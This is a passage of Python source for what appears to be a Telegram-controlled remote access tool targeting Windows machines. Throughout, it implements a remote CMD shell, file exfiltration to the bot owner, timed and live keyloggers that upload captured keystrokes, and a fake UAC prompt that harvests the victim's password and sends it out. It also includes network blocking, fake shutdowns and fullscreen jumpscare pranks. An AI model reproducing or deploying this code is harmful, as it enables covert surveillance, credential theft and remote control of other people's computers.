            return self.bsend(f"Error while sending an image\n{e}")

    def altf4(self) -> None:
        print("Sending Alt+F4")
        self.bsend(f"{emoji_dict['keyboard']} Alt F4 Pressed")
        press_key('alt')
        press_key('f4')
        release_key('f4')
        release_key('alt')

    def ask_yesno(self, custom_message: str = "Confirm action") -> bool:
        prompt = (
            f"<b>{custom_message}</b>\n\n"
            "Choose your action:\n"
            "• <b>y</b> / <b>yes</b> — proceed\n"
            "• <b>n</b> / <b>no</b> — abort"
        )

        
        print(f"Asking yes/no: {custom_message}")
        response = self.send_prompt(prompt)
        if response:
            response = response.lower().strip()
        else:
            return False

        return response in ("y", "yes")
    
    @requires_admin
    def block_chrome(self, timeout: int) -> None:
        raise NotImplemented
        print(f"Blocking chrome for {timeout} seconds")
        loading_bar = self.new_loading_bar_timed_worker("Blocking Chrome", timeout, block_chrome, (timeout,))
        if not loading_bar: return
        loading_bar.start()

    @requires_admin
    def block_port(self, port: int, timeout: int) -> None:
        print(f"Blocking port {port} for {timeout} seconds")
        loading_bar = self.new_loading_bar_timed_worker(f"🚫 Blocking Port <b>{port}</b>", timeout, block_port, args=(port, timeout))
        if not loading_bar: return
        loading_bar.start()

    @requires_admin
    def block_http(self, timeout: int) -> None:
        print(f"Blocking HTTP for {timeout} seconds")
        loading_bar = self.new_loading_bar_timed_worker("🚫 Blocking HTTP", timeout, block_http, args=(timeout,))
        if not loading_bar: return
        loading_bar.start()

    @requires_admin
    def block_https(self, timeout: int) -> None:
        warning = "⚠️ *Important Warning*\n\n"\
            "Blocking HTTPS traffic \\(port 443\\) will make your bot *unreachable* from Telegram until the timeout expires\\.\n"\
            "Even if you click *Cancel* on the loading bar\\, the block *will not stop* immediately\\.\n\n"\
            "Are you *absolutely sure* you want to continue\\? *y* / *n*"
        if not self.ask_yesno(warning):
            print("Blocking HTTPS request canceled by user.")
            self.bsendWithMarkdownV2("✅ HTTPS block *cancelled* by you\\.")
            return

        print(f"Blocking HTTPS for {timeout} seconds")
        loading_bar = self.new_loading_bar_timed_worker("🚫 Blocking HTTPS", timeout, block_https, args=(timeout,))
        if not loading_bar: return
        loading_bar.start()

    def breath(self) -> None:
        print("Playing breath sound")
        self.__play_loaded_sound("breath")

    def bsend(self, text: str, retries=0, parse_mode:str|None=None, reply_markup=None) -> int|None:
        print(f"Sending message: retries: {retries} content: {text[:50]} {'...' if len(text)>50 else ''}")
        doit = True
        if retries>3:
            return
        try:
            # We only check connection when we're retrying
            if retries>0:
                sleep(.2)
                doit = check_connection()
            if doit:
                message_id = self.bot.sendMessage(self.owner_id, text, parse_mode=parse_mode, reply_markup=reply_markup)["message_id"]
                self.all_session_messages.append(message_id)
                return message_id
            raise ConnectionError("Connection error: manual connection checking")
        except Exception as e:
            print(f"\nError while sending message: \n{e}\n")
            return self.bsend(text, retries+1, parse_mode=parse_mode, reply_markup=reply_markup)
    
    def bsendWithMarkdownV2(self, text: str, retries=0, reply_markup=None) -> int|None:
        print(f"Sending MarkdownV2 message: {text[:50]}...")
        self.bsend(text, retries, parse_mode="MarkDownV2", reply_markup=reply_markup)

    def bsendWithHtml(self, text: str, retries=0, reply_markup=None) -> int|None:
        print(f"Sending HTML message: {text[:50]}...")
        self.bsend(text, retries, parse_mode="HTML", reply_markup=reply_markup)

    def download_file(self, path: str) -> None:
        print(f"Downloading file: {path}")
        self.bsend(f"📤 Sending file: {path}")
        if not isfile(path):
            self.bsend(f"❌ Could not send file.\nThe file `{path}` does not exist or you don't have permission to access it.")
            return

        size = getsize(path)

        if size <= TELEGRAM_BOT_FILE_MAX_SIZE:
            with open(path, "rb") as fi:
                self.bot.sendDocument(self.owner_id, fi)
                self.bsend("✅ File has been sent successfully!")
            return

        base_name = basename(path)
        part_size = TELEGRAM_BOT_FILE_MAX_SIZE - (len(base_name) + 10)

        with open(path, "rb") as f:
            part_num = 1
            while True:
                chunk = f.read(part_size)
                if not chunk:
                    break

                part_name = f"{base_name}.part{part_num:03d}"
                with open(part_name, "wb") as pf:
                    pf.write(chunk)

                with open(part_name, "rb") as pf:
                    self.bot.sendDocument(
                        self.owner_id,
                        pf,
                        caption=f"📦 {base_name} (part {part_num})"
                    )

                remove(part_name)
                #self.bsend(f"📦 Part {part_num} sent.")
                part_num += 1

        self.bsend("✅ All file parts have been sent successfully!")

    """
.oooooo.   ooo        ooooo oooooooooo.    .oooooo..o                              o8o
d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                              `"'
888           888b     d'888   888      888 Y88bo.       .ooooo.   .oooo.o  .oooo.o oooo   .ooooo.  ooo. .oo.
888           8 Y88. .P  888   888      888  `"Y8888o.  d88' `88b d88(  "8 d88(  "8 `888  d88' `88b `888P"Y88b
888           8  `888'   888   888      888      `"Y88b 888ooo888 `"Y88b.  `"Y88b.   888  888   888  888   888
`88b    ooo   8    Y     888   888     d88' oo     .d8P 888    .o o.  )88b o.  )88b  888  888   888  888   888
`Y8bood8P'  o8o        o888o o888bood8P'   8""88888P'  `Y8bod8P' 8""888P' 8""888P' o888o `Y8bod8P' o888o o888o
    """
    def cmdsession(self) -> None:
        print("Starting CMD session")
        """Interactive CMD session via Telegram."""

        # Initialize CMD session if not already created
        if self.cmd_session is None:
            self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%")

        if self.cmd_session_active:
            self.bsend("⚠️ CMD session is already active.")
            return

        self.cmd_session_active = True
        self.bsendWithHtml(
            "💻 <b>CMD Session Started</b>\n"
            "▫️ <code>exit</code> → close session\n"
            "▫️ <code>:help</code> → show commands"
        )


        # Start output reader threads
        self.cmd_session.run_output_reader_thread(
            lambda x: self.bsend(f"📥 {x}") if x.strip() else None,
            lambda x: self.bsend(f"⚠️ {x}") if x.strip() else None
        )

        sleep(1)  # give the session time to initialize

        while True:
            sleep(0.5)
            command = self.send_prompt("🖊️ ENTER A COMMAND: ")
            arguments = command.split()
            if not arguments:
                continue

            program = arguments[0].lower()

            if program == "exit":
                self.bsend("💻 CMD session stopped.")
                self.cmd_session.stop_output_readed_thread()
                self.cmd_session_active = False
                break

            elif program == ":help":
                self.bsend(CMD_SESSION_HELP)

            elif program == ":kill":
                self.cmd_session.stop_output_readed_thread()
                self.cmd_session.kill()
                self.bsend(
                    "💀 CMD session killed.\n"
                    "A new one will be initialized when you use /cmdsession again."
                )
                self.cmd_session_active = False
                self.cmd_session = None
                break

            elif program == ":download":
                path = " ".join(arguments[1:])
                self.bsend(f"📥 Preparing download for `{path}`")

                #this is used as a check cause somethimes the cwd is not properly captured and executing another command does the job. And cd almost looks good in it. 
                self.cmd_session.write_input("cd")
                sleep(4)  # I love working with processes..

                filepath = join(self.cmd_session.cwd, path)
                self.bsend(f"📦 Starting download for `{filepath}`")

                download_thread = Thread(target=self.download_file, args=(filepath,))
                download_thread.start()

                self.bsend(f"✅ Download completed for `{filepath}`")

            else:
                self.cmd_session.write_input(command)
                self.bsend(f"▶️ Command sent: `{command}`")

    def cantopen(self, process: str) -> None:
        print(f"Adding {process} to cantopen list")
        self.cantopenlist.append(process)
        self.bsend(f"🔒 Added {process} to cantopenlist.")

    def format_user_chat_msg(self, sender, msg):
        ts = now()

        sender = escape_md_v2(sender)
        msg = escape_md_v2(msg)

        return (
            f"┌ `[{ts}]` *{sender}*\n"
            f"└➤ {msg}"
        )

    def format_system_msg(self, msg):
        msg = escape_md_v2(msg)
        return f"⚙️ *SYSTEM*\n{msg}"

    def format_warning_msg(self, msg):
        msg = escape_md_v2(msg)
        return f"⚠️ *CONFIRMATION REQUIRED*\n{msg}"


    def chat(self) -> None:
        chat = ChatRoom()

        interface = BackendUser(
            "RCPT",
            lambda name, msg: self.bsendWithMarkdownV2(self.format_user_chat_msg(name, msg))
        )

        guiuser = GUIUser(getlogin())

        chat.add_user(interface)
        chat.add_user(guiuser)

        def backend_loop(stop: Event):
            self.bsendWithMarkdownV2(self.format_system_msg(
                "Chat session started.\nType 'exit' to leave."
            ))

            while not stop.is_set():
                msg = self.send_prompt("Send To Chat", timeout=120)

                if msg == "exit":
                    confirm = self.ask_yesno(
                        self.format_warning_msg(
                            "Are you sure you want to leave the chat? Y/n"
                        )
                    )
                    if confirm:
                        self.bsendWithMarkdownV2(self.format_system_msg("Chat session terminated."))
                        stop.set()
                        break

                if msg:
                    interface.send(msg)

        stop_event = Event()
        Thread(target=backend_loop, args=(stop_event,), daemon=True).start()
        guiuser.start(stop_event=stop_event)

    def cantopenkiller(self) -> None:
        print("Starting cantopen killer thread")
        while self.running:
            for process in self.cantopenlist:
                if self.check_if_proc_running(process):
                    terminate_process_by_name(process)
            sleep(1)

    def cantopenmenu(self) -> None:
        print("Opening cantopen menu")
        if self.cantopenlist:
            dict_menu = { proc:f"/cantopenremove {proc}" for proc in self.cantopenlist}
            menu = self.new_menu(dict_menu, close_btn_lab="CANTOP_close")
            self.cantopenmenu_ref = menu
        else:
            self.bsend("Cantopenlist is empty.")

    def check_if_proc_running(self, processname) -> bool:
        print(f"Checking if process is running: {processname}")
        return processname.lower().strip() in [x.name().lower().strip() for  x in psutil.process_iter()]

    def checkforface(self) -> None:
        print("Checking for face")
        res, frame = detect_face(self.cap)
        if res:
            self.bsend("Face found")
        else:
            self.bsend("Face not found")

    def clear(self) -> None:
        print("Clearing windows, webcam, temp files")
        self.closecap()
        for file in listdir(BURN_DIRECTORY):
            try:
                if isfile(file):
                    remove(file)
            except:
                pass#ignore file errors
        destroyAllWindows()
        try:
            self.hdmiDrownerOverlayPlayer.stop()
        except:
            ...
        self.audio_mixer.mute()
        #self.restore_wallpaper()
        self.cantopenlist.clear()

    def closecap(self) -> None:
        print("Closing webcam capture")
        if self.cap.isOpened():
            self.cap.release()

    def distorted_screen(self) -> None:
        print("Distorting screen")
        self.modded_screenshot(lambda x: distorted_screen(x, randint(20, 40), randint(50, 55)))

    def display_mode(self) -> None:
        print("Opening display mode menu")
        buttons = {
            "Only PC"      : "/execute DisplaySwitch.exe /internal",
            "Only External": "/execute DisplaySwitch.exe /external",
            "Clone"        : "/execute DisplaySwitch.exe /clone",
            "Extend"       : "/execute DisplaySwitch.exe /extend",
        }
        self.display_mode_keyboard = self.new_menu(buttons, close_btn_lab="DISPLAYSET_close")

    def delete_message(self, message_id: int) -> None:
        print(f"Deleting message: {message_id}")
        try:
            self.bot.deleteMessage((self.owner_id, message_id))
        except TelegramError:
            ...

    def deletemessages(self, number: int = 1) -> None:
        print(f"Deleting {number} messages")
        message_ids = self.all_session_messages[-number:]
        for message_id in message_ids:
            self.delete_message(message_id)
    
    def deleteallmessages(self) -> None:
        print("Deleting all messages")
        for message_id in self.all_session_messages:
            self.delete_message(message_id)

    def execute(self, *command, return_output: bool=False, shell: bool=False) -> None:
        print(f"Executing command: {' '.join(command)}")
        command = " ".join(command)
        s = sp.run(command, shell=shell, stdout=sp.PIPE, stderr=sp.PIPE, encoding="cp850")
        if s.returncode:
            output = s.stderr
        else:
            output = s.stdout

        if output:
            if return_output:
                return output
            else:
                self.bsend(f"Output: {output}")

    def extract_commands(self) -> list[dict]:
        print("Extracting commands list")
        COMMAND_RE = re.compile(r"^[a-z0-9_]{1,32}$")
        cs = []

        for command in self.commands:
            name = command.name
            desc = command.description

            # category skip
            if command.category in ("menu", "utility", "testing", "null"):
                continue

            # command count limit
            if len(cs) >= TELEGRAM_COMMANDS_LIMIT:
                print(f"Command error: too many commands (max {TELEGRAM_COMMANDS_LIMIT}).")
                break

            # empty checks
            if not name or not desc:
                print(f"Command error: empty name or description -> {name!r}")
                continue

            # length checks
            if len(name) > TELEGRAM_COMMAND_LENGHT_LIMIT:
                print(f"Command error: '{name}' name too long ({len(name)})")
                continue

            if len(desc) > TELEGRAM_COMMAND_DESCRIPTION_LENGHT_LIMIT:
                print(f"Command error: '{name}' description too long ({len(desc)})")
                continue

            # lowercase enforcement
            if name != name.lower():
                print(f"Command error: '{name}' contains uppercase characters")
                continue

            # character set enforcement
            if not COMMAND_RE.fullmatch(name):
                print(f"Command error: '{name}' contains invalid characters")
                continue

            cs.append({
                "command": name,
                "description": desc
            })

        return cs

    def fake_shutdown(self) -> None:
        print("Faking shutdown")
        system('shutdown /s /t 34 /c "Windows Error 104e240-69, please notify the administrator"')
        sleep(5)
        system("shutdown -a")

    def fakeuac(self) -> None:
        print("Showing fake UAC prompt")
        proc = sp.run(fake_uac_prompt_path, stdout=sp.PIPE, stderr=sp.PIPE)
        if proc.returncode:
            output = proc.stderr
        else:
            output = proc.stdout
        uacfiles = filter(lambda x:x.endswith(".fuac"), listdir())
        for file in uacfiles:
            with open(file, "r") as fi:
                password = fi.read().strip()
                safe_password = html.escape(password)
                self.bsendWithHtml(f"Password: <tg-spoiler>{safe_password}</tg-spoiler>")
            remove(file)

    def gabinetti(self) -> None:
        print("Playing Gabinetti meme")
        self.jumpscare("plankton_meme", "gabinetti")

    def handle_conflict(self) -> None:
        self.stop(confirm=False)

    def handle(self, msg: str) -> None:
        print(f"Handling message type: {glance(msg)[0]}")
        content_type, chat_type, chat_id = glance(msg)
        if chat_id in self.strangers:
            return
        sender_name = msg["from"]["first_name"]
        message_id = msg["message_id"]
        user = msg['from']
        username = user.get('username') or "N/A"


        if chat_id == self.owner_id:
            self.owner_name = sender_name

            if content_type != "pinned_message":
                self.all_session_messages.append(message_id)

            if content_type == "text":
                self.parse_text(msg)
            elif content_type == "photo":
                self.parse_photo(msg)
            elif content_type == "document":
                self.parse_document(msg)
            elif content_type == "video":
                self.parse_document(msg, mimetype="video")
            elif content_type in ("voice", "audio"):
                Thread(target=self.parse_audio, args=(msg, )).start()
            elif content_type == "pinned_message":
                self.delete_message(message_id)
            elif content_type == "video_note":
                Thread(target=self.parse_document, args=(msg, "video_note")).start()
            else:
                self.bsend(f"Unparsed content-type: {content_type}")
        else:
            # Handling strangers
            stranger_message = (
                f"⛔ <b>Unauthorized Entity</b>\n\n"
                f"<code>{sender_name} | @{username} | {chat_id}</code>\n\n"
                f"Status: <b>BLOCKED BY BOT</b>\n"
                f"No further responses will be issued."
            )
            self.bot.sendMessageWithHtml(chat_id, stranger_message)
            self.bsend(f"Message from {sender_name} @{username} `{chat_id}`:\n{msg.get('text')}")
            self.strangers.append(chat_id)

    def inverted_screen(self) -> None:
        print("Inverting screen colors")
        self.modded_screenshot(invert_image)

    def getip(self):
        print("Getting public IP")
        output = get_public_ip()
        self.bsend(f"🌐 Public IP: {output}")

    def get_audio_wintoasts(self) -> None:
        sounds = "\n".join(
            f"• <code>{html.escape(name)}</code>"
            for name in sorted(WinotifyAudioMap.keys())
        )

        return (
            "🔊 <b>Available Windows Toast Sounds</b>\n\n"
            "Default audio: <code>Default</code>\n"
            "Audio names are <b>case-insensitive</b>\n\n"
            f"{sounds}"
        )

    def get_logs(self):
        print("Getting logs")
        try:
            if self.logger:
                fname = f"{randomname()}.log"
                logs = self.logger.get_logs()
                if not logs:
                    self.bsend("No logs")
                    return
                file = craft_file(logs, fname)
                self.bot.sendDocument(self.owner_id, file)
        except Exception as e:
            self.bsend(f"Exception while sending logs: \n{e}")

    def get_disk_info(self):
        print("Getting disk info")
        disks = get_disk_info()
        full_message = "\n".join(map(format_disk, disks))
        self.bsend(full_message, parse_mode="HTML")

    def johnpork(self, audio=True) -> None:
        print(f"Playing John Pork meme, audio={audio}")
        self.jumpscare("johnpork_meme", "johnpork", playaudio=audio, setvolume=100)

    def johnporknoaudio(self) -> None:
        print("Playing John Pork meme without audio")
        self.johnpork(False)

    def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True, setvolume: int|None = None) -> None:
        print(f"Triggering jumpscare, image={image}, audio={audio}")
        old_volume = self.audio_mixer.getVolumePercentage()
        self.audio_mixer.setVolumePercentage(self.jumpscare_volume if not setvolume else setvolume)
        if image is None:
            image = self.images[choice(list(self.nomemes))]
        else:
            if image in self.images:
                image = self.images[image]
            else:
                image = imread(image)
        if audio is None:
            audio = self.audios["ghost-roar"]
        else:
            audio = self.audios[audio]
        imageThread = Thread(target=show_image_fullscreen ,args=(image,))

        if showimage:
            imageThread.start()
        if playaudio:
            self.audio_player.play_wav(audio)
        if showimage:
            imageThread.join()
        self.audio_mixer.setVolumePercentage(old_volume)

    def jumpscarenoaudio(self) -> None:
        print("Triggering jumpscare without audio")
        self.jumpscare(playaudio=False)

    def keylogger_to_buffer(self, state: dict["value":str,"running":bool]) -> None:
        print("Starting keylogger to buffer")
        while state["running"]:
            event = read_event()
            if event.event_type == KEY_DOWN:
                name = event.name
                if len(name) != 1:
                    if name == "space":
                        k=" "
                    elif name == "maiusc":
                        continue
                    elif name == "backspace":
                        state["value"]=state["value"][:-1]
                        continue
                    else:
                        k=f" <{name.upper()}> "
                else:
                    k = name
                state["value"]+=k

    @cancellable(check_interval=0.08)  # ← adds auto-check loop
    def keylogger(self, timeout: int = 10) -> None:
        """
        Captures keystrokes for `timeout` seconds.
        Fully cancellable via loading bar cancel button.
        """
        self.bsend(f"⌨️ Keylogger started — {timeout} seconds (cancel anytime)")

        buffer = []
        shift_pressed = False
        caps_on = False
        ctrl_pressed = False

        loading = self.new_loading_bar(
            total=timeout,
            label="Keylogger",
            showperc=True,
        )
        if not loading: return

        start_time = monotonic()

        try:
            while monotonic() - start_time < timeout:
                elapsed = monotonic() - start_time
                loading.update(elapsed)

                if loading.canceled:
                    loading.fill_and_delete()
                    self.bsend("🛑 Keylogger cancelled by user")
                    return

                # Blocking call — decorator handles interruption via cancel_event
                event = read_event(suppress=False)

                if event.event_type == KEY_DOWN:
                    name = event.name.lower()

                    if name in ("left shift", "right shift"):
                        shift_pressed = True
                        continue
                    if name in ("left ctrl", "right ctrl"):
                        ctrl_pressed = True
                        continue
                    if name == "caps lock":
                        caps_on = not caps_on
                        continue

                    char = None
                    if len(name) == 1:
                        char = name
                        if shift_pressed != caps_on:
                            char = char.upper()

                    elif name == "space":
                        char = " "
                    elif name == "enter":
                        char = "\n"
                    elif name == "tab":
                        char = "\t"
                    elif name in ("backspace", "delete"):
                        if buffer:
                            buffer.pop()
                        continue
                    else:
                        if name not in ("left", "right", "up", "down", "page up", "page down"):
                            key = name.upper().replace(" ", "_")
                            prefix = "CTRL+" if ctrl_pressed else ""
                            buffer.append(f"[{prefix}{key}]")

                    if char is not None:
                        buffer.append(char)

                elif event.event_type == KEY_UP:
                    name_lower = event.name.lower()
                    if name_lower in ("left shift", "right shift"):
                        shift_pressed = False
                    if name_lower in ("left ctrl", "right ctrl"):
                        ctrl_pressed = False

            loading.fill_and_delete()

            if not buffer:
                self.bsend("No keys were pressed during this period.")
                return

            content = "".join(buffer)
            count = len(buffer)

            file_obj = craft_file(
                content=content,
                filename=f"keylog_{datetime.now():%Y-%m-%d_%H%M%S}.txt"
            )

            self.bot.sendDocument(
                self.owner_id,
                document=file_obj,
                caption=f"Keylogger finished • {count} events captured • {timeout}s"
            )

            self.bsend(f"Done — {count} characters/events captured.")

        except Exception as e:
            loading.fill_and_delete()
            self.bsendWithHtml(
                f"Keylogger error:\n<pre>{html.escape(str(e))}</pre>"
            )

    def leftclick(self) -> None:
        print("Left mouse click")
        pg.leftClick()

    def live_keylogger(self, timeout=10) -> None:
        print(f"Starting live keylogger for {timeout} seconds")
        start = monotonic()
        bar = self.new_loading_bar(timeout, label=f"📡 Live Keylogger")
        if not bar: return
        state = {"value":"📡 Live Keylogger Output: ",
                  "running":True}
        buffer_message = self.new_editable_message(state["value"])
        elapsed = 0
        Thread(target=self.keylogger_to_buffer, args=(state, )).start()
        while elapsed < timeout:
            if bar.canceled:
                bar.fill_and_delete()
                return
            elapsed = monotonic()-start
            bar.update(elapsed)
            buffer_message.edit(state["value"])
        state["running"]=False
        bar.fill_and_delete()
        
    def load_plugins(self, bot: Bot, plugin_classes: list[type[Plugin]]) -> dict[str, dict[str, Callable]]:
        print("Loading plugins")
        """
        Instantiate and bind all plugins, then export their commands for the bot.
        Returns a registry mapping button labels to (Command, action) tuples.
        """
        registry = {}

        for cls in plugin_classes:
            plugin = cls()
            plugin.bind_bot(bot)
            plugin.bind_pep(self)

            exported = plugin.export()
            registry.update(exported)

        for label, (command, action, description) in registry.items():
            if label == STARTUP_SCRIPT_MARKER:
                continue
            if label == ONLOAD_PLUGINS_MARKER:
                action()
                continue
            new_command = Command(name=command,
                                  function=action,
                                  description=description,
                                  category="🔌 PlugIns",
                                  label=label)
            self.commands.append(new_command)
            self.function_table.update({command:action})
        return registry


    def message_box(self, text: str, title: str = "Warning") -> int:
        print(f"Showing message box: {title} - {text}")
        def run():
            ctypes.windll.user32.MessageBoxW(0, text, title, 0x1000)
        Thread(target=run, daemon=True).start()

    def mixer_menu(self) -> None:
        print("Opening mixer menu")
        buttons = {
            "🔊Full Volume":"/fullvolume",
            "🔉Half Volume":"/setvolume 50",
            "🔇Mute":"/mutevolume",
        }
        self.mixer_menu_keyboard = self.new_menu(buttons, close_btn_lab="MXR_close")

    def modded_screenshot(self, effect: Callable, timeout: int=1250) -> None:
        print(f"Taking modified screenshot with effect: {effect.__name__}")
        filename = join(BURN_DIRECTORY, randompngname())
        pg.screenshot(filename)
        img = imread(filename)
        modded_img = effect(img)
        show_image_fullscreen(modded_img, timeout)

    def mousecontroller(self) -> None:
        print("Opening mouse controller")
        menu = {
            "LEFT CLICK":"/leftclick", "UP":"/mouseu","RIGHTCLICK":"/rightclick",
            "LEFT":"/mousel","DOWN":"/moused","RIGHT":"/mouser"
        }
        self.mouse_controller_menu = self.new_menu(menu, label=f"{emoji_dict['mouse']} Mouse Control", rows=3, close_btn_lab="MOUSE_closemenu")

    def setMouseJump(self, jump: int= None) -> None:
        print(f"Setting mouse jump to: {jump}")
        if jump is None:
            jmp = self.send_prompt("Set mouse jump: ")
        if jmp.isnumeric():
            jmp = int(jmp)
            if jmp < 1:
                self.bsend("Mouse jump mouse be above 0.")
            self.MOUSE_JMP = jmp
        else:
            self.bsend("Mouse jump must be numeric.")

    def setJumpscareVolume(self, volume: int= None) -> None:
        print(f"Setting jumpscare's volume to: {volume}")
        if volume is None:
            jmp = self.send_prompt("Set jumpscare's volume: ")
        if jmp.isnumeric():
            jmp = int(jmp)
            if jmp < 0:
                self.bsend("Volume must be a positive number.")
            self.jumpscare_volume = min(jmp, 100)
        else:
            self.bsend("Jumpscare's volume must be numeric.")

    def moused(self) -> None:
        print("Moving mouse down")
        moused(self.MOUSE_JMP)

    def mousel(self) -> None:
        print("Moving mouse left")
        mousel(self.MOUSE_JMP)

    def mouser(self) -> None:
        print("Moving mouse right")
        mouser(self.MOUSE_JMP)

    def mouseu(self) -> None:
        print("Moving mouse up")
        mouseu(self.MOUSE_JMP)

    def mouselock(self, timer: int=6) -> None:
        print(f"Locking mouse for {timer} seconds")
        bar = self.new_loading_bar_timed_worker(
            label="Mouse Locked",
            duration=timer,
            target=lock_mouse_position,
            on_cancel=unlock_mouse,
            block_default_cancel=True)
        bar.start()
        print("Unlocking mouse")
        unlock_mouse()

    def mainmenu(self):
        print("Opening main menu")
        buttons = {}
        for command in self.commands:
            if not command.category=="menu":
                continue
            label = command.label
            submenu = command.name
            buttons[label] = submenu

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()

        self.mainmenu_ref = ButtonsMenu(
            chat_id=self.owner_id,
            bot=self.bot,
            buttons=buttons,
            label="Select a category:",
            close_btn_lab="mainmenu_close",
            next_btn=True,
            next_btn_lab="mainmenu_next",
            prev_btn_lab="mainmenu_prev"
        )
        return self.mainmenu_ref

    # Generic submenu generator
    def generate_category_menu(self, category_name: str, menu_label: str = None) -> ButtonsMenu:
        print(f"Generating category menu: {category_name}")
        buttons = {"🔙 Back": "/mainmenu"}
        for cmd in [c for c in self.commands if c.category == category_name]:
            buttons[cmd.label] = f"/{cmd.name}"

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()

        self.mainmenu_ref = ButtonsMenu(
            chat_id=self.owner_id,
            bot=self.bot,
            buttons=buttons,
            label=menu_label or category_name,
            close_btn_lab="mainmenu_close",
            next_btn=True,
            next_btn_lab="mainmenu_next",
            prev_btn_lab="mainmenu_prev"
        )
        return self.mainmenu_ref
    
    """
    ooo        ooooo
    `88.       .888'
    888b     d'888   .ooooo.  ooo. .oo.   oooo  oooo   .oooo.o
    8 Y88. .P  888  d88' `88b `888P"Y88b  `888  `888  d88(  "8
    8  `888'   888  888ooo888  888   888   888   888  `"Y88b.
    8    Y     888  888    .o  888   888   888   888  o.  )88b
    o8o        o888o `Y8bod8P' o888o o888o  `V88V"V8P' 8""888P'
    """

    def menu_system(self):
        print("Opening system menu")
        return self.generate_category_menu("system", "🛑 System & Shutdown")

    def menu_utilities(self):
        print("Opening utilities menu")
        return self.generate_category_menu("utility", "🔧 Utility")

    def menu_user_interaction(self):
        print("Opening user interaction menu")
        return self.generate_category_menu("user_interaction", "👤 User Interaction")

    def menu_network(self):
        print("Opening network menu")
        return self.generate_category_menu("network", "🌐 Network & Remote Access")

    def menu_camera(self):
        print("Opening camera menu")
        return self.generate_category_menu("camera", "📸 Camera & Screen")

    def menu_audio(self):
        print("Opening audio menu")
        return self.generate_category_menu("audio", "🔊 Audio & Volume")

    def menu_soundfx(self):
        print("Opening sound effects menu")
        return self.generate_category_menu("sound_fx", "🎵 Sound Effects")

    def menu_pranks(self):
        print("Opening pranks menu")
        return self.generate_category_menu("pranks", "😈 Pranks & Visuals")

    def menu_control(self):
        print("Opening control menu")
        return self.generate_category_menu("system_control", "💻 System Control")

    def menu_input(self):
        print("Opening input menu")
        return self.generate_category_menu("input", "🎮 Input / Device Control")

    def menu_messaging(self):
        print("Opening messaging menu")
        return self.generate_category_menu("messaging", "📋 Messaging")

    def menu_cantopen(self):
        print("Opening cantopen menu")
        return self.generate_category_menu("cant_open", "🔒 Can't Open List")

    def menu_keylogger(self):
        print("Opening keylogger menu")
        return self.generate_category_menu("keylogger", "🧠 Keylogger")

    def menu_mitm(self):
        print("Opening MITM menu")
        return self.generate_category_menu("mitm", "🕵️‍♂️ MITM")

    def menu_misc(self):
        print("Opening misc menu")
        return self.generate_category_menu("misc", "🦑 Misc")

    def menu_plugins(self):
        print("Opening plugins menu")
        return self.generate_category_menu("plugins", "🔌 Your Plugins")

    def menu_ducky(self):
        print("Opening ducky script menu")
        buttons = {
            i:f"/duckyscript {i}" for i in KEYMAP.keys()
        }
        return self.new_menu(buttons)

    def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
        print(f"Creating editable message: {content[:50]}...")
        editable = EditableMessage(self.bot, self.owner_id, content, autosend)
        self.all_session_messages.append(editable.message_id)
        return editable

    def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar|None:
        print(f"Creating loading bar: {label}, total={total}")
        if isinstance(total, str):
            if total.replace(".","").isdigit():
                total = float(total)
            else:
                self.operation_canceled("Loading bar was passed a total that was not a valid number")
                print(f"[LoadingBar] total was not a number, it was: '{total}'")
                return None
        loadingbar = LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10, cancel_button=True) 
        self.bars.update({id(loadingbar):loadingbar})
        return loadingbar

    def new_loading_bar_timed_worker(self, label: str, duration: int, target: Callable, args: tuple=(), on_cancel: Callable|None=None, on_complete: Callable|None=None, block_default_cancel: bool=False) -> LoadingBarTimedWorker:
        print(f"Creating loading bar worker: {label}, duration={duration}")
        if isinstance(duration, str):
            if duration.replace(".","").isdigit():
                duration = float(duration)
            else:
                self.operation_canceled("LoadingBarTimedWorker was passed a total that was not a valid number")
                print(f"[LoadingBarTimedWorker] duration was not an float, it was: '{duration}'")
                return None
        loadingbar_tw = LoadingBarTimedWorker(
            label=label,
            duration=duration,
            chat_id=self.owner_id,
            bot=self.bot,
            target=target,
            args=args,
            on_cancel=on_cancel, 
            on_complete=on_complete,
            block_default_cancel=block_default_cancel,
            loading_bar_kwargs={
                "full_char":self.loading_bar_set[0],
                "empty_char":self.loading_bar_set[1],
                "spinner_frames":self.loading_bar_spinner,
                "spinner_pos":"right",
                "bar_lenght":10,
                }, 
        )
        loadingbar = loadingbar_tw.get_loading_bar()
        self.bars.update({id(loadingbar):loadingbar})
        return loadingbar_tw

    def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
        print(f"Creating new menu: {label}")
        menu = ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
        self.all_session_messages.append(menu.message_id)
        return menu

    def on_callback_query(self, msg) -> None:
        print("Handling callback query")
        query_id, from_id, data = glance(msg, flavor="callback_query")
        Thread(target=self.parse_command, args=(data, )).start()
        self.bot.answerCallbackQuery(query_id)

    def opencap(self) -> None:
        print("Opening webcam capture")
        if not self.cap.isOpened():
            self.cap.open(0)

    def operation_canceled(self, info: str | None = None) -> None:
        print(f"Operation cancelled: {info=}")
        message = "🚫 <b>Operation cancelled</b>"
        if info:
            safe_info = (info.replace("&", "&amp;")
                            .replace("<", "&lt;")
                            .replace(">", "&gt;"))
            message += f"\n<i>{safe_info}</i>"

        self.bsendWithHtml(message)

    def parse_audio(self, msg: dict) -> None:
        print("Parsing audio message")
        if 'voice' in msg:
            file_id = msg['voice']['file_id']
        elif 'audio' in msg:
            file_id = msg['audio']['file_id']
        file_info = self.bot.getFile(file_id)
        file_url = f"https://api.telegram.org/file/bot{self.token}/{file_info['file_path']}"
        filename = randomname()+".ogg"
        filepath = join(BURN_DIRECTORY, filename)
